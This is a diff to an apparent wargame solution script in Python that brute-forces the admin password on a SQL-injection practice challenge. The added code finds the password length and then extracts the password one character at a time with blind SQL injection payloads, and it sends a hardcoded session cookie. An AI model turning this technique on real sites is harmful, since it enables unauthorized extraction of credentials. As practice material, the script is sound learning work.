@@ -55,8 +55,25 @@ import urllib.request
 from urllib.parse import quote
 
 result = ""
+pwlen = 0
 
-for i in range(1,9):
+for i in range(1,10):
+    url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
+    add_url = "' or length(pw)={} -- ;".format(i)
+    print("Searching Password Length.. [{}]".format(i))
+    add_url = quote(add_url)
+    new_url = url + add_url
+    re = urllib.request.Request(new_url)
+    re.add_header("User-Agent","Mozilla/5.0")
+    re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
+    response = urllib.request.urlopen(re)
+
+    if str(response.read()).find("Hello admin") != -1:
+        pwlen = i
+        print("Found length!! => {}".format(pwlen))
+        break
+
+for i in range(1,pwlen+1):
     for j in range(ord('0'),ord('z')):
         url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
         add_url = "' or id='admin' and substr(pw,1,{})='{}' -- ;".format(str(i), result+chr(j))
